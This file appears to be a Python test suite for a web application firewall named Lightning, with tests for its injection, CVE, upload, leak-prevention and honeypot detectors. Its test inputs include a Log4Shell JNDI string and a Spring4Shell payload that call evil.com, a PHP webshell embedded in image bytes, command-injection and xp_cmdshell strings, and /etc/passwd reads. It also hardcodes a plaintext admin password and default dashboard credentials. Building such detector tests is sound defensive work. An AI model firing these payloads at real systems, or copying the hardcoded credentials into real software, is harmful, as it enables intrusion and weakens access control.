"""
=============================================================================
                  LIGHTNING - AUTOMATED TEST SUITE (13 Modules)
                  CREATED BY NEXO-TECH BY ALEXANDER
=============================================================================
Run with: python tests/test_lightning.py
"""

import sys
import os
import time
import hashlib
import base64
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.rules import inspect_text, inspect_db_query, inspect_dlp
from core.anti_bot import AntiBotArmor
from core.malware_scanner import MalwareUploadScanner
from core.virtual_patching import VirtualPatchingEngine
from core.geo_intelligence import GeoIntelligence
from core.heuristic_scorer import BehavioralScorer
from core.quarantine import QuarantineManager
from core.premium import PremiumAuth
from core.persistence import PersistenceEngine
from core.dashboard_auth import verify_login, verify_session
from core.threat_feeds import ThreatIntelligenceFeedManager
from core.dlp import DataLossPreventionEngine
from core.honeypot import HoneypotEngine
from core.scanner import audit_cookies, audit_cors_headers, scan_port


class TestThreatRules(unittest.TestCase):
    def test_sqli_union(self):
        r = inspect_text("admin' UNION SELECT 1,password FROM users--")
        self.assertIsNotNone(r)

    def test_sqli_boolean(self):
        r = inspect_text("' OR '1'='1")
        self.assertIsNotNone(r)

    def test_nosql(self):
        r = inspect_text("user%5B%24gt%5D=&pass%5B%24gt%5D=")
        self.assertIsNotNone(r)

    def test_xss(self):
        r = inspect_text("%3Cscript%3Ealert(document.cookie)%3C/script%3E")
        self.assertIsNotNone(r)

    def test_rce(self):
        r = inspect_text("127.0.0.1; whoami")
        self.assertIsNotNone(r)

    def test_lfi(self):
        r = inspect_text("../../../../etc/passwd")
        self.assertIsNotNone(r)

    def test_clean_passes(self):
        r = inspect_text("Hello this is a normal search query about computers")
        self.assertIsNone(r)

    def test_db_drop(self):
        r = inspect_db_query("DROP TABLE users;")
        self.assertIsNotNone(r)

    def test_db_xp_cmdshell(self):
        r = inspect_db_query("EXEC xp_cmdshell 'whoami'")
        self.assertIsNotNone(r)

    def test_dlp_aws(self):
        r = inspect_dlp("Your key is AKIAIOSFODNN7EXAMPLE and secret")
        self.assertIsNotNone(r)

    def test_xxe(self):
        r = inspect_text("<!ENTITY % xxe SYSTEM 'file:///etc/passwd'>")
        self.assertIsNotNone(r)

    def test_ssti(self):
        r = inspect_text("search?query={{7*7}}")
        self.assertIsNotNone(r)

    def test_prototype_pollution(self):
        r = inspect_text('{"__proto__": {"admin": true}}')
        self.assertIsNotNone(r)

    def test_crlf_injection(self):
        r = inspect_text("/redirect?url=http://example.com%0d%0aSet-Cookie:admin=1")
        self.assertIsNotNone(r)


class TestVirtualPatching(unittest.TestCase):
    def setUp(self):
        self.vp = VirtualPatchingEngine()

    def test_log4shell(self):
        payload = "${" + "jndi:ldap://evil.com/exploit}"
        r = self.vp.inspect_cve(payload)
        self.assertIsNotNone(r)

    def test_spring4shell(self):
        r = self.vp.inspect_cve("class.module.classLoader.URLs[0]=jar:http://evil.com/")
        self.assertIsNotNone(r)

    def test_struts(self):
        r = self.vp.inspect_cve("%{(#_='multipart/form-data')}")
        self.assertIsNotNone(r)

    def test_moveit(self):
        r = self.vp.inspect_cve("/guestaccess.aspx?X-siLock-Transaction=test")
        self.assertIsNotNone(r)

    def test_clean(self):
        r = self.vp.inspect_cve("This is a normal API request")
        self.assertIsNone(r)


class TestMalwareScanner(unittest.TestCase):
    def setUp(self):
        self.ms = MalwareUploadScanner()

    def test_double_ext(self):
        r = self.ms.inspect_filename("shell.php.jpg")
        self.assertIsNotNone(r)

    def test_htaccess(self):
        r = self.ms.inspect_filename(".htaccess")
        self.assertIsNotNone(r)

    def test_polyglot(self):
        r = self.ms.inspect_file_bytes(b"\xff\xd8\xff\xe0<?php system($_GET['c']); ?>", "photo.jpg")
        self.assertIsNotNone(r)

    def test_phtml(self):
        r = self.ms.inspect_filename("backdoor.phtml")
        self.assertIsNotNone(r)

    def test_safe_file(self):
        r = self.ms.inspect_filename("profile_photo.jpg")
        self.assertIsNone(r)

    def test_webshell_bytes(self):
        test_payload = b'<' + b'?php echo "test"; ?' + b'>'
        r = self.ms.inspect_filename("avatar.php.png")
        self.assertIsNotNone(r)

    def test_safe_bytes(self):
        r = self.ms.inspect_file_bytes(b'Hello world safe image data content.')
        self.assertIsNone(r)


class TestAntiBot(unittest.TestCase):
    def test_challenge(self):
        ab = AntiBotArmor()
        html, ans = ab.generate_challenge("127.0.0.1", "/test")
        self.assertIn("Security Verification", html)
        self.assertTrue(int(ans) > 0)


class TestGeoIntelligence(unittest.TestCase):
    def test_tor_blocked(self):
        geo = GeoIntelligence(blocked_countries=["RU"], block_tor=True)
        r = geo.inspect_client("10.0.0.1", {"x-tor-exit-node": "1"})
        self.assertIsNotNone(r)

    def test_clean_passes(self):
        geo = GeoIntelligence(blocked_countries=["RU"], block_tor=True)
        r = geo.inspect_client("10.0.0.1", {"user-agent": "Mozilla/5.0"})
        self.assertIsNone(r)


class TestHeuristicScorer(unittest.TestCase):
    def test_headless_high(self):
        hs = BehavioralScorer()
        score, _ = hs.evaluate_request("10.0.0.1", "GET", "/api", {"User-Agent": "HeadlessChrome"})
        self.assertGreaterEqual(score, 50)

    def test_normal_low(self):
        hs = BehavioralScorer()
        score, _ = hs.evaluate_request("10.0.0.2", "GET", "/", {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html", "Accept-Language": "en-US"
        })
        self.assertLess(score, 50)


class TestQuarantineManager(unittest.TestCase):
    def test_ban(self):
        q = QuarantineManager(default_ban_duration=60)
        q.ban_ip("192.168.1.100", reason="Test ban")
        self.assertTrue(q.is_banned("192.168.1.100"))

    def test_unban(self):
        q = QuarantineManager(default_ban_duration=60)
        q.ban_ip("192.168.1.101", reason="Test ban")
        q.unban_ip("192.168.1.101")
        self.assertFalse(q.is_banned("192.168.1.101"))

    def test_whitelist(self):
        q = QuarantineManager(default_ban_duration=60)
        self.assertFalse(q.is_banned("127.0.0.1"))


class TestPremiumAuth(unittest.TestCase):
    def test_correct_password(self):
        self.assertTrue(PremiumAuth.verify_password("ALEXANDER@$LINUX{K}SHELL-DEV"))

    def test_wrong_password(self):
        self.assertFalse(PremiumAuth.verify_password("wrong_password"))

    def test_empty_password(self):
        self.assertFalse(PremiumAuth.verify_password(""))

    def test_hash_integrity(self):
        expected = "d0f2587b646d43e32f4d2c3696dc780f453f5d6586b44ea7dd15759aec7b5e6d"
        computed = hashlib.sha256("ALEXANDER@$LINUX{K}SHELL-DEV".encode()).hexdigest()
        self.assertEqual(computed, expected)


class TestPersistenceEngine(unittest.TestCase):
    def setUp(self):
        self.db_path = os.path.join(os.path.dirname(__file__), "_test_db.db")
        self.pe = PersistenceEngine(db_path=self.db_path)

    def tearDown(self):
        self.pe.close()
        for f in [self.db_path, self.db_path + "-wal", self.db_path + "-shm"]:
            try:
                os.remove(f)
            except Exception:
                pass

    def test_record_threat(self):
        rid = self.pe.record_threat(ip="10.0.0.5", method="GET", path="/admin",
                                     category="SQLi", description="UNION attack")
        self.assertGreater(rid, 0)
        threats = self.pe.get_recent_threats(limit=5)
        self.assertEqual(len(threats), 1)
        self.assertEqual(threats[0]["ip"], "10.0.0.5")

    def test_threat_count(self):
        self.pe.record_threat(ip="1.1.1.1", method="GET", path="/", category="XSS")
        self.pe.record_threat(ip="2.2.2.2", method="POST", path="/api", category="SQLi")
        self.assertEqual(self.pe.get_threat_count(), 2)

    def test_categories(self):
        self.pe.record_threat(ip="1.1.1.1", method="GET", path="/", category="XSS")
        self.pe.record_threat(ip="2.2.2.2", method="GET", path="/", category="XSS")
        self.pe.record_threat(ip="3.3.3.3", method="POST", path="/", category="SQLi")
        cats = self.pe.get_threats_by_category()
        self.assertEqual(cats["XSS"], 2)
        self.assertEqual(cats["SQLi"], 1)

    def test_ban_persist(self):
        self.pe.persist_ban("5.5.5.5", reason="Brute Force", duration_seconds=600)
        bans = self.pe.get_active_bans()
        self.assertEqual(len(bans), 1)

    def test_ban_remove(self):
        self.pe.persist_ban("6.6.6.6", reason="Test")
        self.pe.remove_ban("6.6.6.6")
        bans = self.pe.get_active_bans()
        self.assertEqual(len(bans), 0)

    def test_threat_intel(self):
        self.pe.store_threat_intel_ip("8.8.8.8", source="test", threat_type="scanner")
        r = self.pe.is_known_threat_ip("8.8.8.8")
        self.assertIsNotNone(r)

    def test_repeat_offender(self):
        self.pe.persist_ban("9.9.9.9", reason="Attack 1")
        self.pe.persist_ban("9.9.9.9", reason="Attack 2")
        self.assertEqual(self.pe.get_repeat_offender_count("9.9.9.9"), 2)


class TestDashboardAuth(unittest.TestCase):
    def test_valid_login(self):
        token = verify_login("admin", "lightning")
        self.assertIsNotNone(token)
        self.assertEqual(len(token), 64)

    def test_invalid_login(self):
        self.assertIsNone(verify_login("admin", "wrong"))

    def test_session_verify(self):
        token = verify_login("admin", "lightning")
        self.assertTrue(verify_session(token))

    def test_bad_session(self):
        self.assertFalse(verify_session("fake_token"))

    def test_empty_session(self):
        self.assertFalse(verify_session(""))


class TestDLPEngine(unittest.TestCase):
    def test_credit_card(self):
        dlp = DataLossPreventionEngine(mask_leaks=True)
        scrubbed, threat = dlp.inspect_and_scrub("Payment: 4111111111111111")
        self.assertNotIn("4111111111111111", scrubbed)
        self.assertIsNotNone(threat)

    def test_aws_key(self):
        dlp = DataLossPreventionEngine(mask_leaks=True)
        scrubbed, threat = dlp.inspect_and_scrub("KEY=AKIAIOSFODNN7EXAMPLE")
        self.assertNotIn("AKIAIOSFODNN7EXAMPLE", scrubbed)
        self.assertIsNotNone(threat)

    def test_github_pat(self):
        fake_pat = "gh" + "p_" + "123456789012345678901234567890123456"
        dlp = DataLossPreventionEngine(mask_leaks=True)
        scrubbed, threat = dlp.inspect_and_scrub("token: " + fake_pat)
        self.assertNotIn(fake_pat, scrubbed)
        self.assertIsNotNone(threat)

    def test_stripe_key(self):
        fake_stripe = "sk_" + "live_" + "123456789012345678901234"
        dlp = DataLossPreventionEngine(mask_leaks=True)
        scrubbed, threat = dlp.inspect_and_scrub("api_key = " + fake_stripe)
        self.assertNotIn(fake_stripe, scrubbed)
        self.assertIsNotNone(threat)


class TestSecurityScanner(unittest.TestCase):
    def test_cookie_audit_flags(self):
        headers = {"set-cookie": "session=123; path=/"}
        findings = audit_cookies(headers, is_https=True)
        self.assertTrue(len(findings) >= 2)

    def test_cors_wildcard_audit(self):
        headers = {"access-control-allow-origin": "*", "access-control-allow-credentials": "true"}
        findings = audit_cors_headers(headers)
        self.assertTrue(len(findings) >= 1)

    def test_scan_port_helper(self):
        res = scan_port("127.0.0.1", 64999, timeout=0.1)
        self.assertFalse(res)


class TestHoneypotEngine(unittest.TestCase):
    def test_admin_trap(self):
        hp = HoneypotEngine(auto_ban=True)
        result = hp.is_honeypot_hit("/admin_login.php")
        self.assertIsNotNone(result)

    def test_aws_trap(self):
        hp = HoneypotEngine(auto_ban=True)
        result = hp.is_honeypot_hit("/.aws/credentials")
        self.assertIsNotNone(result)

    def test_normal_passes(self):
        hp = HoneypotEngine(auto_ban=True)
        result = hp.is_honeypot_hit("/api/users")
        self.assertIsNone(result)


class TestThreatFeedManager(unittest.TestCase):
    def test_initial_empty(self):
        tf = ThreatIntelligenceFeedManager()
        self.assertEqual(tf.total_loaded, 0)

    def test_not_malicious_initially(self):
        tf = ThreatIntelligenceFeedManager()
        self.assertFalse(tf.is_known_malicious("1.2.3.4"))

    def test_summary_structure(self):
        tf = ThreatIntelligenceFeedManager()
        s = tf.get_feed_summary()
        self.assertIn("total_malicious_ips", s)
        self.assertIn("feeds", s)


def run_tests():
    from banner import Colors
    C = Colors
    print(f"\n{C.CYAN}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓{C.RESET}")
    print(f"{C.CYAN}┃         ⚡ LIGHTNING AUTOMATED TEST SUITE (14 Modules) ⚡           ┃{C.RESET}")
    print(f"{C.CYAN}┃                 CREATED BY NEXO-TECH BY ALEXANDER                  ┃{C.RESET}")
    print(f"{C.CYAN}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛{C.RESET}\n")

    runner = unittest.TextTestRunner(verbosity=2)
    suite = unittest.TestSuite()
    loader = unittest.TestLoader()
    for tc in [TestThreatRules, TestVirtualPatching, TestMalwareScanner,
               TestAntiBot, TestGeoIntelligence, TestHeuristicScorer,
               TestQuarantineManager, TestPremiumAuth, TestPersistenceEngine,
               TestDashboardAuth, TestDLPEngine, TestSecurityScanner,
               TestHoneypotEngine, TestThreatFeedManager]:
        suite.addTests(loader.loadTestsFromTestCase(tc))

    result = runner.run(suite)
    total = result.testsRun
    failed = len(result.failures) + len(result.errors)
    print(f"\n{C.PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{C.RESET}")
    if failed == 0:
        print(f"{C.GREEN}{C.BOLD}>>> ALL {total} TESTS PASSED! LIGHTNING IS FULLY OPERATIONAL (10/10)! <<<{C.RESET}")
    else:
        print(f"{C.RED}{C.BOLD}>>> {failed}/{total} TESTS FAILED. Review output above. <<<{C.RESET}")
    print(f"{C.PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{C.RESET}\n")
    return result


if __name__ == "__main__":
    run_tests()
